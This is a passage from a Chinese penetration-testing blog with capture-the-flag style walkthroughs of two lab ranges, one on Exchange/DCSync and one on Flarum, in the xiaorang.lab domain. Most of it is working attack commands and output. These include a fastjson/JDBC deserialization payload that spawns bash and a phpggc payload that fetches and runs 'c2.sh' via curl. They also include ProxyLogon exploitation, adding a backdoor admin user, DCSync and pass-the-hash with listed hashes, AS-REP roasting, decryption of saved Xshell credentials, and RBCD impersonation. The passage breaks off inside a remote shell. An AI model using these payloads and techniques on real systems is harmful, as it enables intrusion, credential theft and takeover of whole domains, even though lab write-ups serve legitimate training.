href=\"https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/05.exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#%E8%AF%B4%E6%98%8E\">exchange相关漏洞</a></p>\n<p>二、Dcsync攻击</p>\n<p><a href=\"https://tttang.com/archive/1634/\">DCSync 技术的攻击和检测</a> 、<a href=\"https://www.geekby.site/2020/05/dcsync-%E6%94%BB%E5%87%BB/\">DCSync 攻击</a> 、<a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync\">域渗透-DCSync</a></p>\n<p>三、Exchange与Dcsync</p>\n<p><a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83\">域渗透——使用Exchange服务器中特定的ACL实现域提权</a></p>\n<p>四、Exchange邮件导出</p>\n<p>脚本：<a href=\"https://github.com/Jumbo-WJB/PTH_Exchange\">https://github.com/Jumbo-WJB/PTH_Exchange</a></p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.3.12</th>\n<th>iZ8vbhidac6emrzabcvappZ</th>\n<th>外网华夏 (Lumia) ERP</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.3.9</td>\n<td>XIAORANG-EXC01.xiaorang.lab</td>\n<td>Microsoft Exchange Server 邮件服务器</td>\n</tr>\n<tr>\n<td>172.22.3.26</td>\n<td>XIAORANG-PC.xiaorang.lab</td>\n<td>目标用户 Lumia PC机</td>\n</tr>\n<tr>\n<td>172.22.3.2</td>\n<td>XIAORANG-WIN16.xiaorang.lab</td>\n<td>域控制器</td>\n</tr>\n</tbody></table>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p>后台fastjson反序列化打jdbc，cc6链</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t&quot;name&quot;: &#123;</span><br><span class=\"line\">\t\t&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class=\"line\">\t\t&quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,</span><br><span class=\"line\">\t\t&quot;hostToConnectTo&quot;: &quot;vps&quot;,</span><br><span class=\"line\">\t\t&quot;portToConnectTo&quot;: 3306,</span><br><span class=\"line\">\t\t&quot;info&quot;: &#123;</span><br><span class=\"line\">\t\t\t&quot;user&quot;: &quot;deser_CC31_bash -c &#123;echo,...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;,</span><br><span class=\"line\">\t\t\t&quot;password&quot;: &quot;pass&quot;,</span><br><span class=\"line\">\t\t\t&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,</span><br><span class=\"line\">\t\t\t&quot;autoDeserialize&quot;: &quot;true&quot;,</span><br><span class=\"line\">\t\t\t&quot;NUM_HOSTS&quot;: &quot;1&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>fscan扫描结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">start infoscan</span><br><span class=\"line\">(icmp) Target 172.22.3.12     is alive</span><br><span class=\"line\">(icmp) Target 172.22.3.9      is alive</span><br><span class=\"line\">(icmp) Target 172.22.3.2      is alive</span><br><span class=\"line\">(icmp) Target 172.22.3.26     is alive</span><br><span class=\"line\">[*] Icmp alive hosts len is: 4</span><br><span class=\"line\">172.22.3.12:80 open</span><br><span class=\"line\">172.22.3.26:445 open</span><br><span class=\"line\">172.22.3.2:445 open</span><br><span class=\"line\">172.22.3.9:445 open</span><br><span class=\"line\">172.22.3.9:443 open</span><br><span class=\"line\">172.22.3.2:139 open</span><br><span class=\"line\">172.22.3.26:139 open</span><br><span class=\"line\">172.22.3.9:139 open</span><br><span class=\"line\">172.22.3.26:135 open</span><br><span class=\"line\">172.22.3.9:135 open</span><br><span class=\"line\">172.22.3.2:135 open</span><br><span class=\"line\">172.22.3.9:81 open</span><br><span class=\"line\">172.22.3.9:80 open</span><br><span class=\"line\">172.22.3.12:22 open</span><br><span class=\"line\">172.22.3.9:8172 open</span><br><span class=\"line\">172.22.3.9:808 open</span><br><span class=\"line\">172.22.3.12:8000 open</span><br><span class=\"line\">172.22.3.2:88 open</span><br><span class=\"line\">[*] alive ports len is: 18</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.3.2</span><br><span class=\"line\">   [-&gt;]XIAORANG-WIN16</span><br><span class=\"line\">   [-&gt;]172.22.3.2</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.3.12        code:200 len:19813  title:lumia</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.3.26</span><br><span class=\"line\">   [-&gt;]XIAORANG-PC</span><br><span class=\"line\">   [-&gt;]172.22.3.26</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.3.9</span><br><span class=\"line\">   [-&gt;]XIAORANG-EXC01</span><br><span class=\"line\">   [-&gt;]172.22.3.9</span><br><span class=\"line\">[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*] NetBios 172.22.3.26     XIAORANG\\XIAORANG-PC          </span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.3.12:8000   code:302 len:0      title:None 跳转url: http:&#x2F;&#x2F;172.22.3.12:8000&#x2F;login.html</span><br><span class=\"line\">[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.3.12:8000&#x2F;login.html code:200 len:5662   title:Lumia ERP</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。</span><br><span class=\"line\">[*] WebTitle https:&#x2F;&#x2F;172.22.3.9:8172   code:404 len:0      title:None</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.3.9         code:403 len:0      title:None</span><br><span class=\"line\">[*] WebTitle https:&#x2F;&#x2F;172.22.3.9        code:302 len:0      title:None 跳转url: https:&#x2F;&#x2F;172.22.3.9&#x2F;owa&#x2F;</span><br><span class=\"line\">[*] WebTitle https:&#x2F;&#x2F;172.22.3.9&#x2F;owa&#x2F;auth&#x2F;logon.aspx?url&#x3D;https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason&#x3D;0 code:200 len:28237  title:Outlook</span><br><span class=\"line\">已完成 18&#x2F;18</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p>内网存在一个exchange</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215144540537.png\" alt=\"image-20241215144540537\"></p>\n<p>ProxyLogon直接RCE，<a href=\"https://github.com/hausec/ProxyLogon\">https://github.com/hausec/ProxyLogon</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215150848370.png\" alt=\"image-20241215150848370\"></p>\n<p>添加用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user hack Abc@123 &#x2F;add</span><br><span class=\"line\">net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><blockquote>\n<p>在 Exchange 安装完后，域内会添加一个名为 Microsoft Exchange Security Groups 的 OU，其包括两个特殊的组：Exchange Windows Permissions 和 Exchange Trusted Subsystem，后者隶属于前者。而前者拥有对域分区的 WriteDACL 权限。因此可以利用 Exchange 机器账户对域分区添加任意 ACL 进行提权，可导致添加 Dcsync 权限导出域内所有 Hash。</p>\n</blockquote>\n<p>mimikatz抓密码/hash，只获取到exchange的机器账户和一个域内用户Zhangtong</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">XIAORANG-EXC01$</span><br><span class=\"line\">\t65bd8b5afcb88eecfbce7e36ace5a0bb</span><br><span class=\"line\"></span><br><span class=\"line\">Zhangtong</span><br><span class=\"line\">\t22c7f81993e96ac83ac2f3f1903de8b4</span><br></pre></td></tr></table></figure>\n\n<p>利用 <code>XIAORANG-EXC01$</code> 机器账户凭证，为任意域账户添加 Dcsync 权限，这里选择 <code>自身账户</code> 或 <code>Zhangtong</code> 账户都可</p>\n<p>Dcsync的添加方式有以下方式：</p>\n<ul>\n<li>bloodyAD</li>\n<li>dacledit.py</li>\n<li>PowerView.ps1：<a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bloodyAD:</span><br><span class=\"line\">proxychains bloodyAD -d xiaorang.lab -u &#39;XIAORANG-EXC01$&#39; -p :b0d89dce8c89f4a43758961e8f782174 --host 172.22.3.2 add dcsync Zhangtong</span><br><span class=\"line\"></span><br><span class=\"line\">dacledit.py:</span><br><span class=\"line\">proxychains4 -q impacket-dacledit xiaorang.lab&#x2F;XIAORANG-EXC01\\$ -hashes :65bd8b5afcb88eecfbce7e36ace5a0bb -action write -rights DCSync -principal Zhangtong -target-dn &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -dc-ip 172.22.3.2</span><br><span class=\"line\"></span><br><span class=\"line\">PowerView.ps1:</span><br><span class=\"line\">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class=\"line\">Import-Module .\\PowerView.ps1;</span><br><span class=\"line\">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xiaorang,DC&#x3D;lab&quot; -PrincipalIdentity Zhangtong -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215155920513.png\"></p>\n<p>可以使用PowerView查询权限是否添加成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module  .\\Powerview.ps1</span><br><span class=\"line\">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;DS-Replication-Get-Changes&quot;&#125;</span><br><span class=\"line\">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.ObjectAceType  -match &quot;Replicating Directory Changes&quot;&#125; </span><br></pre></td></tr></table></figure>\n\n<p>添加完Dcsync权限后，导出域内所有hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">secretsdump远程导:</span><br><span class=\"line\">proxychains4 -q impacket-secretsdump xiaorang.lab&#x2F;Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz本地导:</span><br><span class=\"line\">mimikatz.exe &quot;log log.txt&quot; &quot;lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv &quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215160100254.png\" alt=\"image-20241215160100254\"></p>\n<p>获取域管hash后，PTH登录域控获取flag04</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215160238184.png\" alt=\"image-20241215160238184\"></p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p>通过域内所有hash进行喷洒，在172.22.3.26使用账户 Lumia 喷洒成功，该账号桌面存在加密文件secrets.zip，通过导出 Lumia 用户邮件，翻找信息，某邮件中附件为手机号信息，利用手机号爆破出zip密码获得flag03</p>\n<p>脚本导出邮件：<a href=\"https://github.com/Jumbo-WJB/PTH_Exchange\">https://github.com/Jumbo-WJB/PTH_Exchange</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 python3 pthexchange.py --target https:&#x2F;&#x2F;172.22.3.9 --username &quot;Lumia&quot; --password &quot;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&quot; --action Download</span><br></pre></td></tr></table></figure>\n\n<p>或者exchange手动导出邮件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用 Get-ExchangeServer cmdlet 查询 Exchange Server 的主机名、版本、数据路径:</span><br><span class=\"line\">PS C:\\&gt; Get-ExchangeServer | fl name,edition,admindisplayversion,datapath</span><br><span class=\"line\"></span><br><span class=\"line\">查看所有用户的邮件大小：</span><br><span class=\"line\">PS C:\\&gt; PowerShell.exe -PSConsoleFile &quot;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\exshell.psc1&quot; -Command &quot;Get-Mailbox -ResultSize unlimited&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">将所有用户的邮件以 .pst 格式导出至 C:\\Users\\public\\ 目录下：</span><br><span class=\"line\">PS C:\\Users\\Public&gt; PowerShell.exe -PSConsoleFile &quot;$&#123;Env:ExchangeInstallPath&#125;Bin\\exshell.psc1&quot; -Command &#123;Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\\\localhost\\c$\\users\\public\\&quot;+($_.name)+&quot;.pst&quot;) -BadItemLimit unlimited -AcceptLargeDataLoss -CompletedRequestAgeLimit 0&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">下载所有 .pst 邮件：</span><br><span class=\"line\">proxychains4 -q cme smb XIAORANG-EXC01.xiaorang.lab -u Administrator -H 7acbc09a6c0efd81bfa7d5a1d4238beb --get-file &#39;\\\\Users\\\\Public\\\\Administrator.pst&#39; &#x2F;home&#x2F;kali&#x2F;Administrator.pst</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241215161116370.png\" alt=\"image-20241215161116370\"></p>\n","categories":["云境靶场"]},{"title":"春秋云境-Flarum","url":"/2025/05/24/Flarum/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/7fae5ffecb2d2ed19b55ea2ed05f5357.png\" style=\"zoom:67%;\" />\n\n\n\n<table>\n<thead>\n<tr>\n<th>172.22.60.52</th>\n<th>web01</th>\n<th>外网 Flarum CMS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.60.15</td>\n<td>PC1.xiaorang.lab</td>\n<td>存在 Xshell 客户端的主机</td>\n</tr>\n<tr>\n<td>172.22.60.42</td>\n<td>Fileserver.xiaorang.lab</td>\n<td>有 DCSync 权限的主机</td>\n</tr>\n<tr>\n<td>172.22.60.8</td>\n<td>DC.xiaorang.lab</td>\n<td>域控制器</td>\n</tr>\n</tbody></table>\n<h1 id=\"Flarum-RCE\"><a href=\"#Flarum-RCE\" class=\"headerlink\" title=\"Flarum RCE\"></a>Flarum RCE</h1><p>P牛：<a href=\"https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html\">https://www.leavesongs.com/PENETRATION/flarum-rce-tour.html</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php phpggc -p tar -b Monolog&#x2F;RCE6 system &quot;curl http:&#x2F;&#x2F;ip&#x2F;c2.sh|sh&quot;</span><br></pre></td></tr></table></figure>\n\n<p>capabilities 提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@web01:&#x2F;$ getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">&#x2F;snap&#x2F;core20&#x2F;1974&#x2F;usr&#x2F;bin&#x2F;ping cap_net_raw&#x3D;ep</span><br><span class=\"line\">&#x2F;snap&#x2F;core20&#x2F;1405&#x2F;usr&#x2F;bin&#x2F;ping cap_net_raw&#x3D;ep</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper cap_net_bind_service,cap_net_admin&#x3D;ep</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;openssl &#x3D;ep</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;mtr-packet cap_net_raw&#x3D;ep</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;ping cap_net_raw&#x3D;ep</span><br><span class=\"line\"></span><br><span class=\"line\">www-data@web01:&#x2F;$ openssl enc -in &quot;&#x2F;root&#x2F;flag&#x2F;flag01.txt&quot;</span><br><span class=\"line\">                                 _         _       _   _                 </span><br><span class=\"line\">  ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ </span><br><span class=\"line\"> &#x2F; __&#x2F; _ \\| &#39;_ \\ &#x2F; _&#96; | &#39;__&#x2F; _&#96; | __| | | | |&#x2F; _&#96; | __| |&#x2F; _ \\| &#39;_ \\&#x2F; __|</span><br><span class=\"line\">| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \\__ \\</span><br><span class=\"line\"> \\___\\___&#x2F;|_| |_|\\__, |_|  \\__,_|\\__|\\__,_|_|\\__,_|\\__|_|\\___&#x2F;|_| |_|___&#x2F;</span><br><span class=\"line\">                 |___&#x2F;                                                   </span><br><span class=\"line\"></span><br><span class=\"line\">flag01: flag&#123;fe5874aa-c534-4f85-a9d3-5878dcbcdbec&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524010946434.png\" alt=\"image-20250524010946434\"></p>\n<p>后台发现疑似域内用户名，连接数据库收集用户名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524011716959.png\" alt=\"image-20250524011716959\"></p>\n<p>fscan扫描</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@web01:&#x2F;tmp$ .&#x2F;fscan -h 172.22.60.0&#x2F;24 -o res.txt</span><br><span class=\"line\"></span><br><span class=\"line\">   ___                              _    </span><br><span class=\"line\">  &#x2F; _ \\     ___  ___ _ __ __ _  ___| | __ </span><br><span class=\"line\"> &#x2F; &#x2F;_\\&#x2F;____&#x2F; __|&#x2F; __| &#39;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;</span><br><span class=\"line\">&#x2F; &#x2F;_\\\\_____\\__ \\ (__| | | (_| | (__|   &lt;    </span><br><span class=\"line\">\\____&#x2F;     |___&#x2F;\\___|_|  \\__,_|\\___|_|\\_\\   </span><br><span class=\"line\">                     fscan version: 1.8.4</span><br><span class=\"line\">start infoscan</span><br><span class=\"line\">trying RunIcmp2</span><br><span class=\"line\">The current user permissions unable to send icmp packets</span><br><span class=\"line\">start ping</span><br><span class=\"line\">(icmp) Target 172.22.60.15    is alive</span><br><span class=\"line\">(icmp) Target 172.22.60.8     is alive</span><br><span class=\"line\">(icmp) Target 172.22.60.42    is alive</span><br><span class=\"line\">(icmp) Target 172.22.60.52    is alive</span><br><span class=\"line\">[*] Icmp alive hosts len is: 4</span><br><span class=\"line\">172.22.60.42:445 open</span><br><span class=\"line\">172.22.60.8:445 open</span><br><span class=\"line\">172.22.60.15:445 open</span><br><span class=\"line\">172.22.60.42:139 open</span><br><span class=\"line\">172.22.60.8:139 open</span><br><span class=\"line\">172.22.60.15:139 open</span><br><span class=\"line\">172.22.60.42:135 open</span><br><span class=\"line\">172.22.60.15:135 open</span><br><span class=\"line\">172.22.60.8:135 open</span><br><span class=\"line\">172.22.60.52:80 open</span><br><span class=\"line\">172.22.60.52:22 open</span><br><span class=\"line\">172.22.60.8:88 open</span><br><span class=\"line\">[*] alive ports len is: 12</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.60.15</span><br><span class=\"line\">   [-&gt;]PC1</span><br><span class=\"line\">   [-&gt;]172.22.60.15</span><br><span class=\"line\">   [-&gt;]169.254.114.116</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.60.42</span><br><span class=\"line\">   [-&gt;]Fileserver</span><br><span class=\"line\">   [-&gt;]172.22.60.42</span><br><span class=\"line\">   [-&gt;]169.254.200.244</span><br><span class=\"line\">[*] NetBios 172.22.60.8     [+] DC:XIAORANG\\DC             </span><br><span class=\"line\">[*] NetBios 172.22.60.15    XIAORANG\\PC1                  </span><br><span class=\"line\">[*] NetBios 172.22.60.42    XIAORANG\\FILESERVER           </span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.60.8</span><br><span class=\"line\">   [-&gt;]DC</span><br><span class=\"line\">   [-&gt;]172.22.60.8</span><br><span class=\"line\">   [-&gt;]169.254.125.251</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.60.52       code:200 len:5867   title:霄壤社区</span><br></pre></td></tr></table></figure>\n\n<p>扫描域内用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerbrute_windows_amd64.exe userenum --dc 172.22.60.8 -d xiaorang.lab usernames.txt -t 30 -o output.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524013555532.png\" alt=\"image-20250524013555532\"></p>\n<p>AS-REP Roasting ，破解出 wangyun 凭证：wangyun/Adm12geC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-GetNPUsers xiaorang.lab&#x2F; -dc-ip 172.22.60.8 -usersfile user.txt -format hashcat -outputfile hashes.txt</span><br><span class=\"line\"></span><br><span class=\"line\">hashcat -m 18200 hashes.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --show</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524013834653.png\" alt=\"image-20250524013834653\"></p>\n<p>拿凭证扫描内网</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 172.22.60.52&#x2F;24 -u wangyun -p Adm12geC</span><br></pre></td></tr></table></figure>\n\n<p>RDP PC1，域内信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\wangyun\\Desktop&gt;net localgroup &quot;Account Operators&quot; &#x2F;domain</span><br><span class=\"line\">别名     Account Operators</span><br><span class=\"line\">注释     成员可以管理域用户和组帐户</span><br><span class=\"line\">成员</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">zhangxin</span><br><span class=\"line\">命令成功完成。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\wangyun\\Desktop&gt;net group &quot;Domain Controllers&quot; &#x2F;domain</span><br><span class=\"line\">组名     Domain Controllers</span><br><span class=\"line\">注释     域中所有域控制器</span><br><span class=\"line\">成员</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">DC$                      FILESERVER$</span><br></pre></td></tr></table></figure>\n\n<p>思路就有了：zhangxin 为 <code>Account Operators</code> 组用户，可以打 FILESERVER 的 RBCD，再利用 FILESERVER 的 <code>Domain Controllers</code> 去Dcsync导hash，所以现在就差一个 zhangxin 凭证</p>\n<p>在PC1的桌面发现xshell，通过解密xshell获取 zhangxin/admin4qwY38cc 用户凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\wangyun\\Desktop&gt;e0e1-config.exe -xshell</span><br><span class=\"line\">正在扫描Xshell...</span><br><span class=\"line\">[*] 开始获取用户路径....</span><br><span class=\"line\">  用户路径: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7</span><br><span class=\"line\">[*] 获取用户路径成功!</span><br><span class=\"line\"></span><br><span class=\"line\">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Xshell信息 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class=\"line\">  XSH路径: C:\\Users\\wangyun\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\\SSH.xsh</span><br><span class=\"line\">  主机: 172.22.60.45</span><br><span class=\"line\">  Port: 22</span><br><span class=\"line\">  用户名: zhangxin</span><br><span class=\"line\">  密码: admin4qwY38cc</span><br><span class=\"line\">  版本: 7.1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"RBCD\"><a href=\"#RBCD\" class=\"headerlink\" title=\"RBCD\"></a>RBCD</h1><p>由于 zhangxin 属于 <code>Account Operators</code>  能修改任意域内非域控机器的委派属性，利用RBCD攻击 Fileserver 主机</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ impacket-addcomputer &#39;xiaorang.lab&#x2F;zhangxin:admin4qwY38cc&#39; -computer-name &#39;TEST$&#39; -computer-pass &#39;p@ssw0rd&#39; -dc-ip 172.22.60.8</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added machine account TEST$ with password p@ssw0rd.</span><br><span class=\"line\"></span><br><span class=\"line\">$ impacket-rbcd &#39;xiaorang.lab&#x2F;zhangxin:admin4qwY38cc&#39; -action write -delegate-from &#39;TEST$&#39; -delegate-to &#39;FILESERVER$&#39; -dc-ip 172.22.60.8</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span><br><span class=\"line\">[*] Delegation rights modified successfully!</span><br><span class=\"line\">[*] TEST$ can now impersonate users on FILESERVER$ via S4U2Proxy</span><br><span class=\"line\">[*] Accounts allowed to act on behalf of other identity:</span><br><span class=\"line\">[*]     TEST$        (S-1-5-21-3535393121-624993632-895678587-1116)</span><br><span class=\"line\"></span><br><span class=\"line\">$ impacket-getST xiaorang.lab&#x2F;TEST$:&#39;p@ssw0rd&#39; -spn cifs&#x2F;FILESERVER.xiaorang.lab -impersonate administrator -dc-ip 172.22.60.8</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in administrator@cifs_FILESERVER.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524025544577.png\" alt=\"image-20250524025544577\"></p>\n<p>PTT Fileserver</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ export KRB5CCNAME&#x3D;administrator@cifs_FILESERVER.xiaorang.lab@XIAORANG.LAB.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">$ impacket-smbexec &#39;xiaorang.lab&#x2F;administrator@FILESERVER.xiaorang.lab&#39; -target-ip 172.22.60.42 -codec gbk -shell-type powershell -no-pass -k</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class=\"line\">PS 